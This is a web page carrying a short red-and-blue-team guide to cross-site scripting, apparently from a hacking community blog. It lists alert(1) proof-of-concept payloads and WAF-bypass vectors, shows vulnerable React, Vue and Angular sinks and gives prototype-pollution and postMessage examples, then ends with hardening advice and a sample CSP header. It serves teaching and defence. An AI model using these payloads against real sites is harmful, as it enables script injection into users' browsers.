<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style id="nuxt-ui-colors">@layer base {
  :root {
  --ui-color-primary-50: var(--color-green-50, oklch(98.2% 0.018 155.826));
  --ui-color-primary-100: var(--color-green-100, oklch(96.2% 0.044 156.743));
  --ui-color-primary-200: var(--color-green-200, oklch(92.5% 0.084 155.995));
  --ui-color-primary-300: var(--color-green-300, oklch(87.1% 0.15 154.449));
  --ui-color-primary-400: var(--color-green-400, oklch(79.2% 0.209 151.711));
  --ui-color-primary-500: var(--color-green-500, oklch(72.3% 0.219 149.579));
  --ui-color-primary-600: var(--color-green-600, oklch(62.7% 0.194 149.214));
  --ui-color-primary-700: var(--color-green-700, oklch(52.7% 0.154 150.069));
  --ui-color-primary-800: var(--color-green-800, oklch(44.8% 0.119 151.328));
  --ui-color-primary-900: var(--color-green-900, oklch(39.3% 0.095 152.535));
  --ui-color-primary-950: var(--color-green-950, oklch(26.6% 0.065 152.934));
  --ui-color-secondary-50: var(--color-blue-50, oklch(97% 0.014 254.604));
  --ui-color-secondary-100: var(--color-blue-100, oklch(93.2% 0.032 255.585));
  --ui-color-secondary-200: var(--color-blue-200, oklch(88.2% 0.059 254.128));
  --ui-color-secondary-300: var(--color-blue-300, oklch(80.9% 0.105 251.813));
  --ui-color-secondary-400: var(--color-blue-400, oklch(70.7% 0.165 254.624));
  --ui-color-secondary-500: var(--color-blue-500, oklch(62.3% 0.214 259.815));
  --ui-color-secondary-600: var(--color-blue-600, oklch(54.6% 0.245 262.881));
  --ui-color-secondary-700: var(--color-blue-700, oklch(48.8% 0.243 264.376));
  --ui-color-secondary-800: var(--color-blue-800, oklch(42.4% 0.199 265.638));
  --ui-color-secondary-900: var(--color-blue-900, oklch(37.9% 0.146 265.522));
  --ui-color-secondary-950: var(--color-blue-950, oklch(28.2% 0.091 267.935));
  --ui-color-success-50: var(--color-green-50, oklch(98.2% 0.018 155.826));
  --ui-color-success-100: var(--color-green-100, oklch(96.2% 0.044 156.743));
  --ui-color-success-200: var(--color-green-200, oklch(92.5% 0.084 155.995));
  --ui-color-success-300: var(--color-green-300, oklch(87.1% 0.15 154.449));
  --ui-color-success-400: var(--color-green-400, oklch(79.2% 0.209 151.711));
  --ui-color-success-500: var(--color-green-500, oklch(72.3% 0.219 149.579));
  --ui-color-success-600: var(--color-green-600, oklch(62.7% 0.194 149.214));
  --ui-color-success-700: var(--color-green-700, oklch(52.7% 0.154 150.069));
  --ui-color-success-800: var(--color-green-800, oklch(44.8% 0.119 151.328));
  --ui-color-success-900: var(--color-green-900, oklch(39.3% 0.095 152.535));
  --ui-color-success-950: var(--color-green-950, oklch(26.6% 0.065 152.934));
  --ui-color-info-50: var(--color-blue-50, oklch(97% 0.014 254.604));
  --ui-color-info-100: var(--color-blue-100, oklch(93.2% 0.032 255.585));
  --ui-color-info-200: var(--color-blue-200, oklch(88.2% 0.059 254.128));
  --ui-color-info-300: var(--color-blue-300, oklch(80.9% 0.105 251.813));
  --ui-color-info-400: var(--color-blue-400, oklch(70.7% 0.165 254.624));
  --ui-color-info-500: var(--color-blue-500, oklch(62.3% 0.214 259.815));
  --ui-color-info-600: var(--color-blue-600, oklch(54.6% 0.245 262.881));
  --ui-color-info-700: var(--color-blue-700, oklch(48.8% 0.243 264.376));
  --ui-color-info-800: var(--color-blue-800, oklch(42.4% 0.199 265.638));
  --ui-color-info-900: var(--color-blue-900, oklch(37.9% 0.146 265.522));
  --ui-color-info-950: var(--color-blue-950, oklch(28.2% 0.091 267.935));
  --ui-color-warning-50: var(--color-yellow-50, oklch(98.7% 0.026 102.212));
  --ui-color-warning-100: var(--color-yellow-100, oklch(97.3% 0.071 103.193));
  --ui-color-warning-200: var(--color-yellow-200, oklch(94.5% 0.129 101.54));
  --ui-color-warning-300: var(--color-yellow-300, oklch(90.5% 0.182 98.111));
  --ui-color-warning-400: var(--color-yellow-400, oklch(85.2% 0.199 91.936));
  --ui-color-warning-500: var(--color-yellow-500, oklch(79.5% 0.184 86.047));
  --ui-color-warning-600: var(--color-yellow-600, oklch(68.1% 0.162 75.834));
  --ui-color-warning-700: var(--color-yellow-700, oklch(55.4% 0.135 66.442));
  --ui-color-warning-800: var(--color-yellow-800, oklch(47.6% 0.114 61.907));
  --ui-color-warning-900: var(--color-yellow-900, oklch(42.1% 0.095 57.708));
  --ui-color-warning-950: var(--color-yellow-950, oklch(28.6% 0.066 53.813));
  --ui-color-error-50: var(--color-red-50, oklch(97.1% 0.013 17.38));
  --ui-color-error-100: var(--color-red-100, oklch(93.6% 0.032 17.717));
  --ui-color-error-200: var(--color-red-200, oklch(88.5% 0.062 18.334));
  --ui-color-error-300: var(--color-red-300, oklch(80.8% 0.114 19.571));
  --ui-color-error-400: var(--color-red-400, oklch(70.4% 0.191 22.216));
  --ui-color-error-500: var(--color-red-500, oklch(63.7% 0.237 25.331));
  --ui-color-error-600: var(--color-red-600, oklch(57.7% 0.245 27.325));
  --ui-color-error-700: var(--color-red-700, oklch(50.5% 0.213 27.518));
  --ui-color-error-800: var(--color-red-800, oklch(44.4% 0.177 26.899));
  --ui-color-error-900: var(--color-red-900, oklch(39.6% 0.141 25.723));
  --ui-color-error-950: var(--color-red-950, oklch(25.8% 0.092 26.042));
  --ui-color-neutral-50: var(--color-slate-50, oklch(98.4% 0.003 247.858));
  --ui-color-neutral-100: var(--color-slate-100, oklch(96.8% 0.007 247.896));
  --ui-color-neutral-200: var(--color-slate-200, oklch(92.9% 0.013 255.508));
  --ui-color-neutral-300: var(--color-slate-300, oklch(86.9% 0.022 252.894));
  --ui-color-neutral-400: var(--color-slate-400, oklch(70.4% 0.04 256.788));
  --ui-color-neutral-500: var(--color-slate-500, oklch(55.4% 0.046 257.417));
  --ui-color-neutral-600: var(--color-slate-600, oklch(44.6% 0.043 257.281));
  --ui-color-neutral-700: var(--color-slate-700, oklch(37.2% 0.044 257.287));
  --ui-color-neutral-800: var(--color-slate-800, oklch(27.9% 0.041 260.031));
  --ui-color-neutral-900: var(--color-slate-900, oklch(20.8% 0.042 265.755));
  --ui-color-neutral-950: var(--color-slate-950, oklch(12.9% 0.042 264.695));
  }
  :root, .light {
  --ui-primary: var(--ui-color-primary-500);
  --ui-secondary: var(--ui-color-secondary-500);
  --ui-success: var(--ui-color-success-500);
  --ui-info: var(--ui-color-info-500);
  --ui-warning: var(--ui-color-warning-500);
  --ui-error: var(--ui-color-error-500);
  }
  .dark {
  --ui-primary: var(--ui-color-primary-400);
  --ui-secondary: var(--ui-color-secondary-400);
  --ui-success: var(--ui-color-success-400);
  --ui-info: var(--ui-color-info-400);
  --ui-warning: var(--ui-color-warning-400);
  --ui-error: var(--ui-color-error-400);
  }
}</style>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=VT323&display=swap">
<style>body,html{background:#f9f9f9;color:#000;margin:0;overflow-x:hidden;padding:0}.page-container{display:flex;flex-direction:column;min-height:100vh}.page-main{box-sizing:border-box;flex:1;margin:0 auto;max-width:1200px;padding:40px 20px;width:100%}.page-article{background:inherit;border-radius:12px;border-top:5px solid #00dc82;box-shadow:0 2px 8px #0000000d;padding:30px}.page-header{margin-bottom:30px}.page-title{font-size:28px;font-weight:700;line-height:1.2;margin:0}.page-content{font-size:16px;line-height:1.6}.page-content img{display:block;height:auto;margin:1rem 0;max-width:100%}@media (max-width:768px){.page-main{padding:30px 16px}.page-article{padding:20px}.page-title{font-size:24px}.page-content{font-size:15px}}@media (prefers-color-scheme:dark){body,html{background:#000;color:#fff}.page-article{background:inherit;box-shadow:0 2px 8px #ffffff0d}}</style>
<style>.footer[data-v-af954be9]{background:#111;color:#ccc;margin-top:2rem;padding:1rem 0;position:relative;z-index:10}.footer__content[data-v-af954be9]{font-size:.875rem;justify-content:space-between;margin:0 auto;max-width:1024px;padding:0 1rem}.footer__content[data-v-af954be9],.footer__heart[data-v-af954be9]{align-items:center;display:flex}.footer__heart .heart[data-v-af954be9]{color:#e53e3e;margin-left:.25rem}.footer__icons a[data-v-af954be9]{color:inherit;margin-left:1rem;pointer-events:auto;text-decoration:none}.footer__icons svg[data-v-af954be9]{display:inline-block;height:1.25rem;vertical-align:middle;width:1.25rem}</style>
<style>pre code .line{display:block}</style>
<link rel="stylesheet" href="/dEEpEst_23/_nuxt/Footer.DGv0-ezE.css" crossorigin>
<link rel="preload" as="fetch" crossorigin="anonymous" href="/dEEpEst_23/blog/complete-xss-series-red-and-blue-team-guide/_payload.json?31d7e8d6-9af3-4906-9032-f5730e2702a0">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/BBaoEpF7.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/Dt5xc-Fp.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/CJ51JWAh.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/9S0yC-kY.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/Dn58f7M7.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/CP44UbXk.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/BaPPqcAr.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/Dgh-NFLj.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/BqWQH5Sz.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/oODo7J3z.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/Cq9ZjdMA.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/CSKp-zkO.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/D-H683DK.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/CValuPmS.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/Cy86wa-r.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/Dk3gD3Dk.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/DCjJ02m2.js">
<link rel="modulepreload" as="script" crossorigin href="/dEEpEst_23/_nuxt/DTeBaSRT.js">
<link rel="preload" as="fetch" fetchpriority="low" crossorigin="anonymous" href="/dEEpEst_23/_nuxt/builds/meta/31d7e8d6-9af3-4906-9032-f5730e2702a0.json">
<link rel="prefetch" as="script" crossorigin href="/dEEpEst_23/_nuxt/BDI3-D6h.js">
<link rel="prefetch" as="script" crossorigin href="/dEEpEst_23/_nuxt/Cm5imoJk.js">
<link rel="prefetch" as="script" crossorigin href="/dEEpEst_23/_nuxt/BEUmk22D.js">
<script type="module" src="/dEEpEst_23/_nuxt/BBaoEpF7.js" crossorigin></script><script>"use strict";(()=>{const t=window,e=document.documentElement,c=["dark","light"],n=getStorageValue("localStorage","nuxt-color-mode")||"system";let i=n==="system"?u():n;const r=e.getAttribute("data-color-mode-forced");r&&(i=r),l(i),t["__NUXT_COLOR_MODE__"]={preference:n,value:i,getColorScheme:u,addColorScheme:l,removeColorScheme:d};function l(o){const s=""+o+"",a="";e.classList?e.classList.add(s):e.className+=" "+s,a&&e.setAttribute("data-"+a,o)}function d(o){const s=""+o+"",a="";e.classList?e.classList.remove(s):e.className=e.className.replace(new RegExp(s,"g"),""),a&&e.removeAttribute("data-"+a)}function f(o){return t.matchMedia("(prefers-color-scheme"+o+")")}function u(){if(t.matchMedia&&f("").media!=="not all"){for(const o of c)if(f(":"+o).matches)return o}return"light"}})();function getStorageValue(t,e){switch(t){case"localStorage":return window.localStorage.getItem(e);case"sessionStorage":return window.sessionStorage.getItem(e);case"cookie":return getCookie(e);default:return null}}function getCookie(t){const c=("; "+window.document.cookie).split("; "+t+"=");if(c.length===2)return c.pop()?.split(";").shift()}</script></head><body  class="bg-white dark:bg-black"><div id="__nuxt" class="isolate"><div class="page-container"><main class="page-main"><article class="page-article"><header class="page-header"><h1 class="page-title"></h1></header><section class="page-content"><div><div><h1 id="️-complete-xss-series-red-blue-team-guide"><!--[-->🛡️ Complete XSS Series – Red &amp; Blue Team Guide<!--]--></h1><p><!--[-->Created for <strong><!--[-->Hack Tools Dark Community<!--]--></strong><!--]--></p><hr><h2 id="table-of-contents"><a href="#table-of-contents"><!--[-->📖 Table of Contents<!--]--></a></h2><ol><!--[--><li><!--[--><a href="#1-xss-basics-and-exploitation"><!--[-->XSS Basics and Exploitation<!--]--></a><!--]--></li><li><!--[--><a href="#2-modern-waf-bypass-techniques"><!--[-->Modern WAF Bypass Techniques<!--]--></a><!--]--></li><li><!--[--><a href="#3-xss-in-spas-react-angular-vue"><!--[-->XSS in SPAs (React, Angular, Vue)<!--]--></a><!--]--></li><li><!--[--><a href="#4-dom-clobbering--prototype-pollution--xss"><!--[-->DOM Clobbering &amp; Prototype Pollution + XSS<!--]--></a><!--]--></li><li><!--[--><a href="#5-xss-via-postmessage-shadow-dom-and-iframe-abuse"><!--[-->XSS via postMessage, Shadow DOM, and iframe Abuse<!--]--></a><!--]--></li><li><!--[--><a href="#6-trusted-types-bypass--iframe-sandbox-escapes"><!--[-->Trusted Types Bypass &amp; iframe Sandbox Escapes<!--]--></a><!--]--></li><li><!--[--><a href="#7-full-blue-team-hardening-guide"><!--[-->Full Blue Team Hardening Guide<!--]--></a><!--]--></li><!--]--></ol><hr><h2 id="_1-xss-basics-and-exploitation"><a href="#_1-xss-basics-and-exploitation"><!--[-->1. XSS Basics and Exploitation<!--]--></a></h2><p><!--[-->Cross-Site Scripting (XSS) allows attackers to execute arbitrary JavaScript in user browsers. It&#39;s still among the most exploited vulnerabilities today.<!--]--></p><h3 id="common-types-of-xss"><a href="#common-types-of-xss"><!--[-->Common Types of XSS<!--]--></a></h3><ul><!--[--><li><!--[--><strong><!--[-->Stored XSS<!--]--></strong>: Injected script is stored and executed when viewed.<!--]--></li><li><!--[--><strong><!--[-->Reflected XSS<!--]--></strong>: Script is reflected off the server (e.g., via URL).<!--]--></li><li><!--[--><strong><!--[-->DOM-Based XSS<!--]--></strong>: Triggered entirely client-side.<!--]--></li><!--]--></ul><h3 id="example-payloads"><a href="#example-payloads"><!--[-->Example Payloads<!--]--></a></h3><pre class="language-html shiki shiki-themes github-light github-dark" style=""><!--[--><code><span class="line" line="1"><span class="sVt8B">&lt;</span><span class="s9eBZ">script</span><span class="sVt8B">&gt;</span><span class="sScJk">alert</span><span class="sVt8B">(</span><span class="sZZnC">&#39;XSS&#39;</span><span class="sVt8B">)&lt;/</span><span class="s9eBZ">script</span><span class="sVt8B">&gt;
</span></span><span class="line" line="2"><span class="sVt8B">&lt;</span><span class="s9eBZ">img</span><span class="sScJk"> src</span><span class="sVt8B">=</span><span class="sZZnC">x</span><span class="sScJk"> onerror</span><span class="sVt8B">=</span><span class="sScJk">alert</span><span class="sZZnC">(</span><span class="sj4cs">1</span><span class="sZZnC">)</span><span class="sVt8B">&gt;
</span></span><span class="line" line="3"><span class="sVt8B">&lt;</span><span class="s9eBZ">a</span><span class="sScJk"> href</span><span class="sVt8B">=</span><span class="sZZnC">&quot;javascript:alert(1)&quot;</span><span class="sVt8B">&gt;Click&lt;/</span><span class="s9eBZ">a</span><span class="sVt8B">&gt;
</span></span></code><!--]--></pre><hr><h2 id="_2-modern-waf-bypass-techniques"><a href="#_2-modern-waf-bypass-techniques"><!--[-->2. Modern WAF Bypass Techniques<!--]--></a></h2><h3 id="techniques"><a href="#techniques"><!--[-->Techniques:<!--]--></a></h3><ul><!--[--><li><!--[-->HTML entity encoding<!--]--></li><li><!--[-->Hex/Unicode encoding<!--]--></li><li><!--[-->Broken tags<!--]--></li><li><!--[-->JavaScript URIs<!--]--></li><li><!--[--><code><!--[-->data:<!--]--></code> URIs with SVG<!--]--></li><li><!--[-->Mutation XSS (mXSS)<!--]--></li><!--]--></ul><h3 id="real-bypass-payloads"><a href="#real-bypass-payloads"><!--[-->Real Bypass Payloads<!--]--></a></h3><pre class="language-html shiki shiki-themes github-light github-dark" style=""><!--[--><code><span class="line" line="1"><span class="sVt8B">&lt;</span><span class="s9eBZ">svg</span><span class="sVt8B">&gt;&lt;</span><span class="s9eBZ">script</span><span class="sScJk"> xlink:href</span><span class="sVt8B">=</span><span class="sZZnC">data:,alert(1)</span><span class="sVt8B">&gt;&lt;/</span><span class="s9eBZ">script</span><span class="sVt8B">&gt;&lt;/</span><span class="s9eBZ">svg</span><span class="sVt8B">&gt;
</span></span><span class="line" line="2"><span class="sVt8B">&lt;</span><span class="s9eBZ">iframe</span><span class="sScJk"> srcdoc</span><span class="sVt8B">=</span><span class="sZZnC">&quot;</span><span class="s7hpK">&lt;</span><span class="sZZnC">script&gt;alert`1`</span><span class="s7hpK">&lt;</span><span class="sZZnC">/script&gt;&quot;</span><span class="sVt8B">&gt;&lt;/</span><span class="s9eBZ">iframe</span><span class="sVt8B">&gt;
</span></span><span class="line" line="3"><span class="sVt8B">&lt;</span><span class="s9eBZ">video</span><span class="sVt8B">&gt;&lt;</span><span class="s9eBZ">source</span><span class="sScJk"> onerror</span><span class="sVt8B">=</span><span class="sZZnC">&quot;</span><span class="sScJk">alert</span><span class="sZZnC">(</span><span class="sj4cs">1</span><span class="sZZnC">)&quot;</span><span class="sVt8B">&gt;
</span></span></code><!--]--></pre><hr><h2 id="_3-xss-in-spas-react-angular-vue"><a href="#_3-xss-in-spas-react-angular-vue"><!--[-->3. XSS in SPAs (React, Angular, Vue)<!--]--></a></h2><h3 id="react"><a href="#react"><!--[-->React:<!--]--></a></h3><pre class="language-jsx shiki shiki-themes github-light github-dark" style=""><!--[--><code><span class="line" line="1"><span class="sVt8B">&lt;</span><span class="s9eBZ">div</span><span class="sScJk"> dangerouslySetInnerHTML</span><span class="szBVR">=</span><span class="sVt8B">{{ __html: userInput }} /&gt;
</span></span></code><!--]--></pre><h3 id="vue"><a href="#vue"><!--[-->Vue:<!--]--></a></h3><pre class="language-html shiki shiki-themes github-light github-dark" style=""><!--[--><code><span class="line" line="1"><span class="sVt8B">&lt;</span><span class="s9eBZ">div</span><span class="sScJk"> v-html</span><span class="sVt8B">=</span><span class="sZZnC">&quot;userInput&quot;</span><span class="sVt8B">&gt;&lt;/</span><span class="s9eBZ">div</span><span class="sVt8B">&gt;
</span></span></code><!--]--></pre><h3 id="angular"><a href="#angular"><!--[-->Angular:<!--]--></a></h3><pre class="language-ts shiki shiki-themes github-light github-dark" style=""><!--[--><code><span class="line" line="1"><span class="sj4cs">this</span><span class="sVt8B">.trust </span><span class="szBVR">=</span><span class="sVt8B"> sanitizer.</span><span class="sScJk">bypassSecurityTrustHtml</span><span class="sVt8B">(userInput);
</span></span></code><!--]--></pre><p><!--[-->Other vectors: <code><!--[-->localStorage<!--]--></code>, route injection, rich text editors.<!--]--></p><hr><h2 id="_4-dom-clobbering-prototype-pollution-xss"><a href="#_4-dom-clobbering-prototype-pollution-xss"><!--[-->4. DOM Clobbering &amp; Prototype Pollution → XSS<!--]--></a></h2><h3 id="dom-clobbering"><a href="#dom-clobbering"><!--[-->DOM Clobbering<!--]--></a></h3><pre class="language-html shiki shiki-themes github-light github-dark" style=""><!--[--><code><span class="line" line="1"><span class="sVt8B">&lt;</span><span class="s9eBZ">input</span><span class="sScJk"> name</span><span class="sVt8B">=</span><span class="sZZnC">&quot;submit&quot;</span><span class="sScJk"> value</span><span class="sVt8B">=</span><span class="sZZnC">&quot;alert(1)&quot;</span><span class="sVt8B">&gt;
</span></span></code><!--]--></pre><h3 id="prototype-pollution"><a href="#prototype-pollution"><!--[-->Prototype Pollution<!--]--></a></h3><pre class="language-js shiki shiki-themes github-light github-dark" style=""><!--[--><code><span class="line" line="1"><span class="sVt8B">_.</span><span class="sScJk">merge</span><span class="sVt8B">({}, </span><span class="sj4cs">JSON</span><span class="sVt8B">.</span><span class="sScJk">parse</span><span class="sVt8B">(</span><span class="sZZnC">&#39;{ &quot;__proto__&quot;: { &quot;x&quot;: &quot;&lt;img src=x onerror=alert(1)&gt;&quot; } }&#39;</span><span class="sVt8B">));
</span></span></code><!--]--></pre><p><!--[-->Can lead to poisoned logic and HTML injection.<!--]--></p><hr><h2 id="_5-xss-via-postmessage-shadow-dom-and-iframe-abuse"><a href="#_5-xss-via-postmessage-shadow-dom-and-iframe-abuse"><!--[-->5. XSS via postMessage, Shadow DOM, and iframe Abuse<!--]--></a></h2><h3 id="postmessage-xss"><a href="#postmessage-xss"><!--[-->postMessage XSS<!--]--></a></h3><pre class="language-js shiki shiki-themes github-light github-dark" style=""><!--[--><code><span class="line" line="1"><span class="sVt8B">window.</span><span class="sScJk">addEventListener</span><span class="sVt8B">(</span><span class="sZZnC">&#39;message&#39;</span><span class="sVt8B">, (</span><span class="s4XuR">e</span><span class="sVt8B">) </span><span class="szBVR">=&gt;</span><span class="sVt8B"> {
</span></span><span class="line" line="2"><span class="sVt8B">  document.</span><span class="sScJk">getElementById</span><span class="sVt8B">(</span><span class="sZZnC">&#39;output&#39;</span><span class="sVt8B">).innerHTML </span><span class="szBVR">=</span><span class="sVt8B"> e.data;
</span></span><span class="line" line="3"><span class="sVt8B">});
</span></span></code><!--]--></pre><h3 id="shadow-dom"><a href="#shadow-dom"><!--[-->Shadow DOM<!--]--></a></h3><pre class="language-js shiki shiki-themes github-light github-dark" style=""><!--[--><code><span class="line" line="1"><span class="sVt8B">el.</span><span class="sScJk">attachShadow</span><span class="sVt8B">({mode: </span><span class="sZZnC">&#39;open&#39;</span><span class="sVt8B">}).innerHTML </span><span class="szBVR">=</span><span class="sVt8B"> userInput;
</span></span></code><!--]--></pre><h3 id="iframe-abuse"><a href="#iframe-abuse"><!--[-->iframe abuse<!--]--></a></h3><pre class="language-html shiki shiki-themes github-light github-dark" style=""><!--[--><code><span class="line" line="1"><span class="sVt8B">&lt;</span><span class="s9eBZ">iframe</span><span class="sScJk"> srcdoc</span><span class="sVt8B">=</span><span class="sZZnC">&quot;</span><span class="s7hpK">&lt;</span><span class="sZZnC">script&gt;alert(1)</span><span class="s7hpK">&lt;</span><span class="sZZnC">/script&gt;&quot;</span><span class="sVt8B">&gt;&lt;/</span><span class="s9eBZ">iframe</span><span class="sVt8B">&gt;
</span></span></code><!--]--></pre><hr><h2 id="_6-trusted-types-bypass-iframe-sandbox-escapes"><a href="#_6-trusted-types-bypass-iframe-sandbox-escapes"><!--[-->6. Trusted Types Bypass &amp; iframe Sandbox Escapes<!--]--></a></h2><h3 id="trusted-types-bypass"><a href="#trusted-types-bypass"><!--[-->Trusted Types Bypass<!--]--></a></h3><pre class="language-js shiki shiki-themes github-light github-dark" style=""><!--[--><code><span class="line" line="1"><span class="sVt8B">document.body.innerHTML </span><span class="szBVR">=</span><span class="sScJk"> String</span><span class="sVt8B">(userInput); </span><span class="sJ8bj">// Unsafe wrapper
</span></span></code><!--]--></pre><p><!--[-->Use DOMPurify in TT mode:<!--]--></p><pre class="language-js shiki shiki-themes github-light github-dark" style=""><!--[--><code><span class="line" line="1"><span class="sVt8B">DOMPurify.</span><span class="sScJk">sanitize</span><span class="sVt8B">(input, {RETURN_TRUSTED_TYPE: </span><span class="sj4cs">true</span><span class="sVt8B">});
</span></span></code><!--]--></pre><h3 id="sandbox-escape"><a href="#sandbox-escape"><!--[-->Sandbox Escape<!--]--></a></h3><pre class="language-html shiki shiki-themes github-light github-dark" style=""><!--[--><code><span class="line" line="1"><span class="sVt8B">&lt;</span><span class="s9eBZ">iframe</span><span class="sScJk"> src</span><span class="sVt8B">=</span><span class="sZZnC">&quot;evil.html&quot;</span><span class="sScJk"> sandbox</span><span class="sVt8B">=</span><span class="sZZnC">&quot;allow-scripts allow-same-origin&quot;</span><span class="sVt8B">&gt;&lt;/</span><span class="s9eBZ">iframe</span><span class="sVt8B">&gt;
</span></span></code><!--]--></pre><p><!--[-->Avoid combining <code><!--[-->allow-scripts<!--]--></code> and <code><!--[-->allow-same-origin<!--]--></code>.<!--]--></p><hr><h2 id="_7-full-blue-team-hardening-guide"><a href="#_7-full-blue-team-hardening-guide"><!--[-->7. Full Blue Team Hardening Guide<!--]--></a></h2><h3 id="defenses"><a href="#defenses"><!--[-->Defenses:<!--]--></a></h3><ul><!--[--><li><!--[-->DOMPurify for sanitization<!--]--></li><li><!--[-->Context-aware escaping<!--]--></li><li><!--[-->Content-Security-Policy (CSP)<!--]--></li><li><!--[-->Trusted Types<!--]--></li><li><!--[-->Safe framework use (no v-html, dangerouslySetInnerHTML)<!--]--></li><li><!--[-->Prototype key blacklisting (<code><!--[-->__proto__<!--]--></code>, <code><!--[-->constructor<!--]--></code>)<!--]--></li><li><!--[-->iframe sandboxing<!--]--></li><li><!--[-->Secure cookies (<code><!--[-->HttpOnly<!--]--></code>, <code><!--[-->Secure<!--]--></code>, <code><!--[-->SameSite<!--]--></code>)<!--]--></li><li><!--[-->CSP reporting &amp; logging<!--]--></li><!--]--></ul><h3 id="sample-csp-header"><a href="#sample-csp-header"><!--[-->Sample CSP Header<!--]--></a></h3><pre class="language-http shiki shiki-themes github-light github-dark" style=""><!--[--><code><span class="line" line="1"><span>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;
</span></span></code><!--]--></pre><hr><h2 id="conclusion"><a href="#conclusion"><!--[-->🎯 Conclusion<!--]--></a></h2><p><!--[-->Modern XSS defense and offense require creativity and precision. Whether you&#39;re building secure systems or breaking them as a Red Teamer — mastering the full landscape of XSS is essential.<!--]--></p><style>html .default .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}html .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}html .dark .shiki span {color: var(--shiki-dark);background: var(--shiki-dark-bg);font-style: var(--shiki-dark-font-style);font-weight: var(--shiki-dark-font-weight);text-decoration: var(--shiki-dark-text-decoration);}html.dark .shiki span {color: var(--shiki-dark);background: var(--shiki-dark-bg);font-style: var(--shiki-dark-font-style);font-weight: var(--shiki-dark-font-weight);text-decoration: var(--shiki-dark-text-decoration);}html pre.shiki code .sVt8B, html code.shiki .sVt8B{--shiki-default:#24292E;--shiki-dark:#E1E4E8}html pre.shiki code .s9eBZ, html code.shiki .s9eBZ{--shiki-default:#22863A;--shiki-dark:#85E89D}html pre.shiki code .sScJk, html code.shiki .sScJk{--shiki-default:#6F42C1;--shiki-dark:#B392F0}html pre.shiki code .sZZnC, html code.shiki .sZZnC{--shiki-default:#032F62;--shiki-dark:#9ECBFF}html pre.shiki code .sj4cs, html code.shiki .sj4cs{--shiki-default:#005CC5;--shiki-dark:#79B8FF}html pre.shiki code .s7hpK, html code.shiki .s7hpK{--shiki-default:#B31D28;--shiki-default-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic}html pre.shiki code .szBVR, html code.shiki .szBVR{--shiki-default:#D73A49;--shiki-dark:#F97583}html pre.shiki code .s4XuR, html code.shiki .s4XuR{--shiki-default:#E36209;--shiki-dark:#FFAB70}html pre.shiki code .sJ8bj, html code.shiki .sJ8bj{--shiki-default:#6A737D;--shiki-dark:#6A737D}</style></div><a href="/dEEpEst_23/blog" class=""><medium>⬅ Back </medium></a></div></section></article><footer class="footer" data-v-af954be9><div class="footer__content" data-v-af954be9><span class="footer__heart" data-v-af954be9>© 2025 HTDark. Made with <span class="heart" data-v-af954be9>❤️</span></span><div class="footer__icons" data-v-af954be9><a href="https://github.com/dEEpEst_23" target="_blank" aria-label="GitHub" data-v-af954be9><svg viewBox="0 0 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg" data-v-af954be9><path d="M8 .198a8 8 0 00-2.53 15.59c.4.074.547-.174.547-.386 0-.19-.007-.693-.01-1.36-2.226.482-2.695-1.073-2.695-1.073-.364-.924-.89-1.17-.89-1.17-.727-.497.055-.487.055-.487.803.056 1.226.825 1.226.825.714 1.223 1.873.87 2.329.665.072-.517.28-.87.508-1.07-1.777-.202-3.644-.888-3.644-3.953 0-.873.312-1.59.824-2.15-.083-.202-.357-1.017.078-2.12 0 0 .672-.215 2.2.82a7.68 7.68 0 012.001-.269 7.68 7.68 0 012.002.27c1.528-1.035 2.2-.82 2.2-.82.435 1.103.161 1.918.079 2.12.513.56.823 1.277.823 2.15 0 3.073-1.868 3.748-3.65 3.948.289.25.546.737.546 1.486 0 1.073-.01 1.94-.01 2.203 0 .214.144.462.55.384A8 8 0 008 .198z" data-v-af954be9></path></svg></a><a href="https://t.me/dEEpEst_23Bot" target="_blank" aria-label="Telegram" data-v-af954be9><svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" data-v-af954be9><path d="M22 2L2 12l5.5 1.5L10 22l3-8.5L22 2z" data-v-af954be9></path></svg></a><a href="https://htdark.com" target="_blank" aria-label="Website" data-v-af954be9><svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" data-v-af954be9><path d="M12 2a10 10 0 100 20 10 10 0 000-20zm4 11h-3v3h-2v-3H8v-2h3V8h2v3h3v2z" data-v-af954be9></path></svg></a></div></div></footer></main></div></div><div id="teleports"></div><script type="application/json" data-nuxt-data="nuxt-app" data-ssr="true" id="__NUXT_DATA__" 